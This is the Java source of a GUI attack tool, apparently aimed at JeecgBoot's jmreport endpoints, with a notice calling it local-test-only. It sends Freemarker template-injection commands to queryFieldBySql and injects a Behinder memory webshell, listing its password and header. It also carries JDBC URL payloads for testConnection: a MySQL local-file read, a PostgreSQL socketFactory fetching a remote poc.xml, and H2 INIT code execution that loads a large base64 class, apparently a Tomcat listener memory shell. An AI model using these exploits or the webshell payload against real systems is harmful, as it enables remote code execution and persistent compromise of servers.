/*
 * Created by JFormDesigner on Sat Jan 18 13:08:57 CST 2025
 */

package me.jeecgBootAttack;

import org.apache.http.HttpHost;

import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import javax.swing.event.*;

import static me.jeecgBootAttack.attack.*;
//import org.jdesktop.swingx.*;

/**
 * @author ycp
 */
public class jeecgBootAttack extends JFrame {

    private HttpHost PROXY = null;

    public void start(){
        initComponents();
        // 自动换行
        result.setLineWrap(true);
        // 设置背景颜色
        getContentPane().setBackground(new Color(-1120293));
        panel1.setBackground(new Color(-1120293));
        panel2.setBackground(new Color(-1120293));
        panel3.setBackground(new Color(-1120293));
//        panel4.setBackground(new Color(-1120293));
//        panel5.setBackground(new Color(-1120293));
        result.setBackground(new Color(-11513776));
        tabbedPane1.setBackground(new Color(-1120293));
        // 设置边框
//        Border  lineBorder = BorderFactory.createLineBorder(Color.BLACK);
//        Border  lineThickerBorder = BorderFactory.createLineBorder(Color.BLACK, 3);
//        Border  etchedRaisedBorder = BorderFactory.createEtchedBorder(EtchedBorder.LOWERED);
//        p1.setBorder(lineBorder);
//        comboBox1.setBorder(etchedRaisedBorder);
        // 设置单选框组
        ButtonGroup group = new ButtonGroup();
        group.add(code1);
        group.add(mem1);
        code1.setSelected(true);
        // 设置单选框组
        ButtonGroup group2 = new ButtonGroup();
        group2.add(mysql);
        group2.add(pgsql);
        group2.add(h2);
        mysql.setSelected(true);
//        设置菜单
        setJMenuBar(createMenuBar());
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setResizable(false);
        setVisible(true);
    }


    private  JMenuBar createMenuBar() {
        JMenuBar menuBar = new JMenuBar();
        menuBar.add(createHelpMenu());
        menuBar.add(createProxyMenu());
        return menuBar;
    }

    private  JMenu createHelpMenu() {
        try {
            JMenu helpMenu = new JMenu("Help");
            helpMenu.setBackground(new Color(-11513776));
            JMenuItem Notice = new JMenuItem("Notice");
            Notice.addActionListener(e ->{
                JOptionPane.showMessageDialog(this,"本工具仅用于本地模拟环境测试 !!!", "Notice", JOptionPane.NO_OPTION);
            });

            JMenuItem SetHeader = new JMenuItem("Set Header");
            SetHeader.addActionListener(e -> {

            });

            helpMenu.add(Notice);
//            helpMenu.add(SetHeader);

            return helpMenu;
        } catch (Exception ex) {
            return null;
        }
    }


    private static JMenu createProxyMenu() {
        try {
            JMenu proxyMenu = new JMenu("Proxy");
            proxyMenu.setBackground(new Color(-11513776));
            JMenuItem setProxy = new JMenuItem("Set Proxy");
            setProxy.addActionListener(e -> {
                new Proxy().setVisible(true);
            });
            proxyMenu.add(setProxy);

            return proxyMenu;
        } catch (Exception ex) {
            return null;
        }
    }
    // 选项卡切换事件
    private void tabbedPane1StateChanged(ChangeEvent e) {
        result.setText("");
        setJdbcDriverPayload();
    }


    private void button3(ActionEvent e) throws Exception {
        if (Proxy.getHOST() != null){
            HttpHost proxy = new HttpHost(Proxy.getHOST(), Proxy.getPORT());
            PROXY = proxy;
        }
        else {
            PROXY = null;
        }
        result.setText("");
        if (!(check(url.getText()) && checkUrl(url.getText()))) {
            result.setText("Please Input Url !!!");
        }
        else {
            String url = this.url.getText();
            if (tabbedPane1.getSelectedIndex()==0){
                url = url + "/jmreport/queryFieldBySql";
                System.out.println("queryFieldBySql Freemarker模板注入");
                if (code1.isSelected()){
                    if (!check(cmd.getText())){
                        result.setText("Please Input cmd !!!");
                    }
                    else {
                        result.setText(queryFieldBySqlCmdSend(url,this.cmd.getText(),PROXY));
                    }
                } else if (mem1.isSelected()) {
                    String memString = "尝试进行连接==============================================================\n" +
                            "1、注入Behinder内存马路径：/*\n" +
                            "2、连接密码：p@ss01\n" +
                            "3、请求头设置：Dtags: www\n" +
                            "======================================================================\n";
                    result.setText(memString+queryFieldBySqlMemSend(url,PROXY));
                }
            } else if (tabbedPane1.getSelectedIndex()==1) {
                url = url + "/jmreport/testConnection";
                System.out.println("testConnection JDBC");
                if (mysql.isSelected() ) {
                    if(check(jdbcuri.getText()) && jdbcuri.getText().contains("mysql")){
                        result.setText(testConnectionSend(url,"com.mysql.jdbc.Driver",jdbcuri.getText(),PROXY));
                    }
                    else {
                        result.setText("Please Input jdbcuri !!!");
                    }

                }
                else if (pgsql.isSelected() ) {
                    if(check(jdbcuri.getText()) && jdbcuri.getText().contains("postgresql")){
                        result.setText(testConnectionSend(url,"org.postgresql.Driver",jdbcuri.getText(),PROXY));
                    }
                    else {
                        result.setText("Please Input jdbcuri !!!");
                    }

                }
                else if (h2.isSelected() ) {
                    if(check(jdbcuri.getText()) && jdbcuri.getText().contains("h2")){
                        String memString = "尝试进行连接==============================================================\n" +
                                "1、注入Behinder内存马路径：/*\n" +
                                "2、连接密码：p@ss01\n" +
                                "3、请求头设置：Dtags: www\n" +
                                "======================================================================\n";
                        result.setText(memString+testConnectionSend(url,"org.h2.Driver",jdbcuri.getText(),PROXY));
                    }
                    else {
                        result.setText("Please Input jdbcuri !!!");
                    }

                }

            }
        }

    }

    public Boolean check(String s){
        return !s.isEmpty();
    }

    // 检测url是否合法
    public Boolean checkUrl(String url){
        return url.contains("https://") || url.contains("http://");
    }

    private void jdbcDriverStateChanged(ActionEvent e) {
        setJdbcDriverPayload();
    }

    private void setJdbcDriverPayload() {
        if (tabbedPane1.getSelectedIndex() == 1){
            if (mysql.isSelected()) {
                result.setText("======================================================================\n" +
                        "jdbc:mysql://ip:port/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=65536&user=base64ZmlsZXJlYWRfZDpcdGVzdC50eHQ=\n" +
                        "======================================================================");
            }
            else if (pgsql.isSelected()) {
                result.setText("======================================================================\n" +
                        "jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://ip:port/poc.xml\n" +
                        "======================================================================");
            }
            else if (h2.isSelected()) {
                result.setText("======================================================================\n" +
                        "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\;}catch (Exception e){e.printStackTrace()\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\"defineClass\\\", byte[].class,int.class,int.class)\\;defineClassMethod.setAccessible(true)\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\;clz.newInstance()\\;}'\\;CALL EXEC('yv66vgAAADEBfQEAFm9yZy9hcGFjaGUvaHovRGF0ZVV0aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAMZ2V0Q2xhc3NOYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQAzb3JnLmFwYWNoZS5jb21tb25zLmxhbmcuV2hpdGVCbGFja0xpc3RLZmFsbExpc3RlbmVyCAAIAQAPZ2V0QmFzZTY0U3RyaW5nAQAKRXhjZXB0aW9ucwEAE2phdmEvaW8vSU9FeGNlcHRpb24HAAwBABBqYXZhL2xhbmcvU3RyaW5nBwAOAQvgSDRzSUFBQUFBQUFBQUoxWGVWeFUxeFgrTGpQd2htRTBjVkFVYlpPNHd6QXdiZ2hDRmtVZ0VBR05rMktRbVBieGVEQlBoNWx4M2hzVTI5ZzJ0ZW1XcG52VGRGK1MwamEyMVRZT0t0VVl1NlJOOXlYZDk3MXArMy8vU2RQdnZ2Y1lZQmpFWDM4TWI3bjNuTytjKzUzbDN2ZmNmeTllQnJBWi94Yllta3dQUjlTVXFzWDBpSlljR1VrbXpFaGNUUXhIRHNRTVMyK0pxOXFSTHNPMDlneXA4Ymg4MEJONldvRVFXSFpZSFZVZDBkMXgxVFM3a3VxZ25QSUlySk5UeHlPbW5oNk42MVlrNnR6MzYwY3p1bWxOZ3hRTGxOeHFKQXpyZGdGUFZYV3ZnSGQzY2xBWHVLSExTT2c5bVpFQlBYMlBPaERuU0xBcnFhbnhYalZ0eUhkMzBHdkZERk9ndnV2L1dFSnpBQXA4Zm5peFdHQmxWVmZCeFRSTG40UW1zSHllZVFseW93UXBwOXd3T2FucWI2bk9sMjNtM0lCQVVYK0xRTm1nUHNTMTJlT0VwWGhuNTF5RkFDcXhVc0t1RXJneDdkRFd5djkwY2t3ZkZOamd1RHNmd1cyamVzS3lYUzgzNTA0SXJMME9iVEx1MnUxa2ZBdzFicHlRbHN1blBXMDdydWtweTBnbUZLemh3bDFNTFQyV3NwS1IzVVlxUm5vRWZHbmRUREVlakZhKzB6SExTa1U2ZU1uWmR5U3BwWmk2YVJKYTRKYjVsV3dKQ251U0E0ZGx5dGl1WlN3akh1bFdVeExFWFlEQXhnVXQyNExVV2IwZ013cHFCZFpmRjU2Q0NHTjFmWXRXc0ZuZ3BtdXZWY0ZXZ1VXemxxbWdua05SaXhuT043Y3NsZ3pyMW14UHlHTlY5VFdqenBScnhBNC82dEFrNEkvcE1ydDcxQkc3OHFaakhyWFNSbUtZc3JmaXRsSVVnWFZiU21NZHRuZ3VMMmZKVmhkUzM0bGRaZGdFV1ErT3FWNDFudEVEYUhWZzI1ajErVm9LN21RMmFjbUVwUm9KbHM2cVdTVWJVOU5SdVpDRXBqZFhId3lnRTNmNTBZRTlBaFhEMHlTM3A1TWpPVWJ1WGpnZkhXYnlpWnMzYndQb1JvK2YvdThsaFhZTTNDUmVNNGY4T1drY3dOM1lMem1KTW43VEllNVF6WmdkNWxmNDBZdkZQdFF3MzFNWnV0ODRjLzE3Qnc3cm10VThkNlI2N2xBQWZUaFlodTNvOTJHOUR4dlpuREkrdkpMZE5NWFdFNERxeElBTnkwZERkbUJZUVFVaVc4QmFid0NEME11d0RVUDBjMWRiMUllWTJ6VHlXb01DMW13WlNlcE1tSmJLc0FsVXo1czkrVzBsZ0RoRy9EZ0NjbnZ6TEFFenBXdk1iQzJ0VzN2MHNTamZGS1M0RWhwcUdiTjA1bzIzcXJxL0pZQTBUSmtnbHRPREN4anVsYTE5MUkrak9FWWx1VWxKMFU1SDB0UzFUTnF3eGlJMFlvdU80WVQwNTlXekV0ZGhSY0VEamdOdXp5K3ZLdFR2WDR2WCtYRVNyMmNqeTV0VThBYUJ4VlA2enI0alVEa1hKYmNsdlJFUCtYRUtiNUtwV081VTZINjNRbGRPcVJuSlNFdG1hRWhQNjRQT0hQWGVpcmZKREh5WVJWTllSc0VqZGtkWEIrWCtMTEMwcW1CMXZ4UHY4dU1kZUxkQVlFQTE5ZTNiV25YTjN0WXJDa1ZZUnVPOWVKOTA5djFzMm9QSmRpT2h4bmt5a0Z1cG5Qd0FIcFBjZmpDQVphaVFZaDltNWlUMFk5T1pNOXVQWEo1L0ZCK1RQSHljV0N4bE5XN0svYmxBMXJKZmZCS2ZrdlEvenNMTjdXc1VMeVoxN2IwTEZsdUJWcGR6WWh5ZmtUNS8xdTN1em14UE1wclJZdTJHSGgrY3NZMCt5VVFiVmRQMVU3dmUvTExOanVTbTJkM1p0ZW5NYlhadVc1Z3FNMFRTK2xDY01oRWJ6cFhrcHJLa3dKRmwrVHhhQ3JMTWNoTERxTVpWNW9ZOUtsQzdRUE9mYlRxQTg3Z2dvM09SKzVmc2xabVVudGJpZGdmNmlxeUZVN2lVRjY1WmxmbTBINmR4aGJxbWJ1M1NOTmxGblNOaDFVRXBjQlZmOVdNQ1gyTVhJbmplem5TdDN2Z05QQ3NWdjhuWTA1c1RKMlJHMnRtYm5qcmo1SjErNUFHRUJ6TW10NWxKMUkwWXBsYlhzaXZhTnBYMGFSKytSNHlocEx1YnJsK0FwYWwrOEFQOFVITHdJOWFRWTkrcFJCOSs0aFIwdDI3RmttUjlad0c4L2psNGhlTGdJTkRVVC9FemFlcm5BaXZtazFMd1N4YVJrUmhOSHVFYWRoUWdzLzg2K2YwMWZ1UEhyL0JiQlN2Y1hsa25ON3E2RnJ0UitQQUhaK3ZNa2ZjbjJuVUk4T0V2MU5pK3ZiNmhZWEM3UHRDNFRXdXMzMUh2dzk4WXFsWkxIVFo5K0FkamNlellNUi8raWRXc09TK29EQSt2M05QNHVTUGtzY1crdDlwM0g1OFUrMXJLdHpacUNONlhoeVp3UXlqNDkzUFFRc0VYenVHT1VQQmY1OUIrbGxORjhQTXF5eG1vNE45eWxQRXA0S2p4dnNnRzV4ZUJDN21Qa2xKMlJhaG1Ba3NYeGx4SmxGVTJab1dqNTJMS3B5VUlFbFhJSHVpaTM4WUZTcW5TVUkybjV2SUVYblltQjFkaXUzVHpES2pTSEZRcGpheXdvVjZPbTF5b2VsdVR6cC9OZzFnM0EwTGtJTGpyNGhZYll2VVVoSGljR2dybnJ0WmswWHdGbTdyRG9hZHd4d1hzTG1KTlBUbjl3b2YyTExvZXc2T2g4QVQyOVlRdjRCNkJKdThrZXZzbWNLQ3B1TEk0ZUM4SDcvUGdBQjhQMWVZZTc2LzB1cy9lNEtzSW8xM0FzQWRCNHp5U1RTV1ZKY1dUT05vbmg3UElCSTBKSE0vaU5aTW82Z3RsOFdBV2I1N0FXeXBMUWdSK3UwQVc3OG5pMFN3K2xNVkhzdmhFWlhFV1R4d1lSM0ZUeVRpOFBXZmw2WWZ0YVJKcm1SeVhjSVYzajgxSk82TUFiT1JvTmY5Q2lLQUdEUWp6T0Z1TFBUdzY5M0prZ0YvVlNXekJLTGJpWVI2RXp2T2tOVW1DTDZHSlNJMTRoa2tvT2UyUXh3dTBFSEVkbVl2Z0VhekhCdHBwd0VPMFVNWFk3c1FEdHBWaXlXcU8rNnN1OXo1Y3BQVXdmVzNnNkFaNFg2S1pFZ1ZGQ3VvVWJGS3dSY0UyaGNhRmdyWC9nV2poVGNhV1IxUmVQMDBkV1I1cjdmQjNjRVJhQ1l2dW11Qzk1L0c1NENGZXJtQkw5emdxZTJwbXZQbWF2T1B3OEJjK1krZjJFaXdseGpMNnRFYkMwMXZ1ZHh5WHFNOXpOUksxVVhUTEdQVFVCazgrZ1lwYTVzY2trUlkxZVd1enVOd3ovdElMNFdjUm1NVHBQaGJKTTArSHZWbDhQVXlGYjUyaGY0dFF6dXc3N2ZLL2hTd0F1NG5mU3ZiYU9kdkIrVTVLM01XVTNzT0U3aUkzZThub1BrWmtQK1dqTnRmYjZNY0svbjhlWCtDcTZSRytpRE0ybTQwNHl6cml0em1KK2hLK3pEcy94UEFVenRtUkFOZm5mUkdLZ2drRnAzb1VuQzROektCT3lIT0x1OWdYR1VTNTJMSGc5OC9qeDkzaDRQUGVTempWNXdsMlJMUDRSWmhaeHZlVGZaNGF2djd1Q242Zis1M3BEdjZSR21Ubnp4NXFVRmp3ZnBKU1RkNUtjdkZnOEs4emtTcTk4K0hZOWJxSjNrOWw2MHE2QkI3MlMzQ1FvLzFrNHo2dTl4QTV1dDltNVhiT2xEQ0hudU5xaXppenkzN3ljTDRXM3lZL1htcmNTYzYrWTFmL1dDNER4L0JkbTdNR3Awc2NsWWsxVFFyK0I3Ykt5akpjRWdBQQgAEAEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAEgATCgAPABQBAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAXAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAIbGlzdGVuZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQAIY29udGV4dHMBABBMamF2YS91dGlsL0xpc3Q7AQAEdGhpcwEAGExvcmcvYXBhY2hlL2h6L0RhdGVVdGlsOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBACRMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBAA5qYXZhL3V0aWwvTGlzdAcAJAEAEmphdmEvdXRpbC9JdGVyYXRvcgcAJgEADVN0YWNrTWFwVGFibGUMABIAFgoABAApAQAKZ2V0Q29udGV4dAEAEigpTGphdmEvdXRpbC9MaXN0OwwAKwAsCgACAC0BAAhpdGVyYXRvcgEAFigpTGphdmEvdXRpbC9JdGVyYXRvcjsMAC8AMAsAJQAxAQAHaGFzTmV4dAEAAygpWgwAMwA0CwAnADUBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsMADcAOAsAJwA5AQALZ2V0TGlzdGVuZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAOwA8CgACAD0BAAthZGRMaXN0ZW5lcgEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwAPwBACgACAEEBAARrZXkxAQAIY2hpbGRyZW4BABNMamF2YS91dGlsL0hhc2hNYXA7AQADa2V5AQALY2hpbGRyZW5NYXABAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAE0BABBqYXZhL2xhbmcvT2JqZWN0BwBPAQAQamF2YS9sYW5nL1RocmVhZAcAUQEAEWphdmEvdXRpbC9IYXNoTWFwBwBTAQATamF2YS91dGlsL0FycmF5TGlzdAcAVQoAVgApAQAKZ2V0VGhyZWFkcwgAWAEADGludm9rZU1ldGhvZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DABaAFsKAAIAXAEAB2dldE5hbWUMAF4ABgoAUgBfAQAcQ29udGFpbmVyQmFja2dyb3VuZFByb2Nlc3NvcggAYQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABjAGQKAA8AZQEABnRhcmdldAgAZwEABWdldEZWDABpAFsKAAIAagEABnRoaXMkMAgAbAgARAEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7DABvAHAKAFQAcQEADWphdmEvdXRpbC9TZXQHAHMLAHQAMQEAA2dldAwAdgA8CgBUAHcBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAHkAegoAUAB7AQAPamF2YS9sYW5nL0NsYXNzBwB9CgB+AF8BAA9TdGFuZGFyZENvbnRleHQIAIABAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAIIAgwsAJQCEAQAVVG9tY2F0RW1iZWRkZWRDb250ZXh0CACGAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAiACJCgBSAIoBAAh0b1N0cmluZwwAjAAGCgB+AI0BABlQYXJhbGxlbFdlYmFwcENsYXNzTG9hZGVyCACPAQAfVG9tY2F0RW1iZWRkZWRXZWJhcHBDbGFzc0xvYWRlcggAkQEACXJlc291cmNlcwgAkwgAHQEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uBwCWAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWDAASAJgKAJcAmQEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCbAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAnQEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24HAJ8BAAlTaWduYXR1cmUBACYoKUxqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEAE2phdmEvbGFuZy9UaHJvd2FibGUHAKMBAAljbGF6ekJ5dGUBAAJbQgEAC2RlZmluZUNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcArQEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwArwCwCgBSALEBAA5nZXRDbGFzc0xvYWRlcgwAswCJCgB+ALQMAAUABgoAAgC2AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAuAC5CgCuALoBAAtuZXdJbnN0YW5jZQwAvAA4CgB+AL0MAAoABgoAAgC/AQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAwQDCCgACAMMBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAxQDGCgACAMcIAKcHAKYBABFqYXZhL2xhbmcvSW50ZWdlcgcAywEABFRZUEUMAM0AqgkAzADOAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DADQANEKAH4A0gEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA1AEADXNldEFjY2Vzc2libGUBAAQoWilWDADWANcKANUA2AEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DADaANsKAMwA3AEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA3gDfCgDVAOABAAdvYmplY3RzAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEACWxpc3RlbmVycwEACWFycmF5TGlzdAEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEACmlzSW5qZWN0ZWQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KVoMAOcA6AoAAgDpAQAbYWRkQXBwbGljYXRpb25FdmVudExpc3RlbmVyCADrAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABaAO0KAAIA7gEAHGdldEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcnMIAPAHAOMBABBqYXZhL3V0aWwvQXJyYXlzBwDzAQAGYXNMaXN0AQAlKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvdXRpbC9MaXN0OwwA9QD2CgD0APcBABkoTGphdmEvdXRpbC9Db2xsZWN0aW9uOylWDAASAPkKAFYA+goAVgCEAQAcc2V0QXBwbGljYXRpb25FdmVudExpc3RlbmVycwgA/QEAB3RvQXJyYXkBABUoKVtMamF2YS9sYW5nL09iamVjdDsMAP8BAAoAVgEBAQABaQEAAUkBAA1ldmlsQ2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEc2l6ZQEAAygpSQwBBwEICgBWAQkBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAHYBCwoAVgEMAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEAB2lnbm9yZWQBAAliYXNlNjRTdHIBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIIARMBAAdmb3JOYW1lDAEVALkKAH4BFgEADGRlY29kZUJ1ZmZlcggBGAEACWdldE1ldGhvZAwBGgDRCgB+ARsBABBqYXZhLnV0aWwuQmFzZTY0CAEdAQAKZ2V0RGVjb2RlcggBHwEABmRlY29kZQgBIQEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwEjAQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwEuAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBMAEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwEyCgEvACkBAAUoW0IpVgwAEgE1CgExATYBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABIBOAoBMwE5AQAEcmVhZAEABShbQilJDAE7ATwKATMBPQEABXdyaXRlAQAHKFtCSUkpVgwBPwFACgEvAUEBAAt0b0J5dGVBcnJheQEABCgpW0IMAUMBRAoBLwFFAQADb2JqAQAJZmllbGROYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBSwFMCgACAU0BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBTwoBUADYCgFQAHcBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAVMBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAVYBVwoAfgFYAQANZ2V0U3VwZXJjbGFzcwwBWgB6CgB+AVsKAVQAFAEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEACnBhcmFtQ2xhenoBABJbTGphdmEvbGFuZy9DbGFzczsBAAVwYXJhbQEABm1ldGhvZAEACXRlbXBDbGFzcwcBYQEAEmdldERlY2xhcmVkTWV0aG9kcwEAHSgpW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAFqAWsKAH4BbAoA1QBfAQAGZXF1YWxzDAFvAIMKAA8BcAEAEWdldFBhcmFtZXRlclR5cGVzAQAUKClbTGphdmEvbGFuZy9DbGFzczsMAXIBcwoA1QF0CgCeABQBAApnZXRNZXNzYWdlDAF3AAYKAJwBeAoAlwAUAQAIPGNsaW5pdD4KAAIAKQAhAAIABAAAAAAADgABAAUABgABAAcAAAAQAAEAAQAAAAQTAAmwAAAAAAABAAoABgACAAsAAAAEAAEADQAHAAAAFwADAAEAAAALuwAPWRMAEbcAFbAAAAAAAAEAEgAWAAEABwAAANgAAwAFAAAANiq3ACoqtgAuTCu5ADIBAE0suQA2AQCZABssuQA6AQBOKi23AD46BCotGQS2AEKn/+KnAARMsQABAAQAMQA0ABgABAAZAAAAJgAJAAAAJAAEACYACQAnACAAKAAnACkALgAqADEALQA0ACsANQAwABoAAAAqAAQAJwAHABsAHAAEACAADgAdABwAAwAJACgAHgAfAAEAAAA2ACAAIQAAACIAAAAMAAEACQAoAB4AIwABACgAAAAaAAT/ABAAAwcAAgcAJQcAJwAA+QAgQgcAGAAAAQArACwAAwAHAAAC2AADAA4AAAF5uwBWWbcAV0wSUhJZuABdwABOwABOTQFOLDoEGQS+NgUDNgYVBhUFogFBGQQVBjI6BxkHtgBgEmK2AGaZALMtxwCvGQcSaLgAaxJtuABrEm64AGvAAFQ6CBkItgByuQB1AQA6CRkJuQA2AQCZAIAZCbkAOgEAOgoZCBkKtgB4Em64AGvAAFQ6CxkLtgByuQB1AQA6DBkMuQA2AQCZAE0ZDLkAOgEAOg0ZCxkNtgB4Ti3GABottgB8tgB/EoG2AGaZAAsrLbkAhQIAVy3GABottgB8tgB/Eoe2AGaZAAsrLbkAhQIAV6f/r6f/fKcAdxkHtgCLxgBvGQe2AIu2AHy2AI4SkLYAZpoAFhkHtgCLtgB8tgCOEpK2AGaZAEkZB7YAixKUuABrEpW4AGtOLcYAGi22AHy2AH8SgbYAZpkACystuQCFAgBXLcYAGi22AHy2AH8Sh7YAZpkACystuQCFAgBXhAYBp/6+pwAPOgS7AJdZGQS3AJq/K7AAAQAYAWgBawAYAAQAGQAAAHIAHAAAADMACAA0ABYANQAYADcAMQA5AEIAOgBYAD0AdwA+AIgAQQCnAEIArwBDAMIARADKAEYA3QBHAOUASADoAEkA6wBKAO4ATAEcAE0BLABOAT8ATwFHAFABWgBRAWIANwFoAFYBawBUAW0AVQF3AFcAGgAAAGYACgCnAD4AQwAcAA0AiABgAEQARQALAHcAcQBGABwACgBYAJMARwBFAAgAMQExAEgASQAHAW0ACgBKAEsABAAAAXkAIAAhAAAACAFxAB4AHwABABYBYwBMAE0AAgAYAWEAHQAcAAMAIgAAAAwAAQAIAXEAHgAjAAEAKAAAAE8ADv8AIwAHBwACBwAlBwBOBwBQBwBOAQEAAP4AQAcAUgcAVAcAJ/4ALwcAUAcAVAcAJ/wANQcAUPoAGvgAAvkAAgItKvoAGvgABUIHABgLAAsAAAAIAAMAnACeAKAAoQAAAAIAogACADsAPAABAAcAAAFwAAYACAAAAIcBTbgAsrYAi04txwALK7YAfLYAtU4tKrYAt7YAu7YAvk2nAGQ6BCq2AMC4AMS4AMg6BRKuEskGvQB+WQMSylNZBLIAz1NZBbIAz1O2ANM6BhkGBLYA2RkGLQa9AFBZAxkFU1kEA7gA3VNZBRkFvrgA3VO2AOHAAH46BxkHtgC+TacABToFLLAAAgAVACEAJAAYACYAgACDAKQAAwAZAAAAPgAP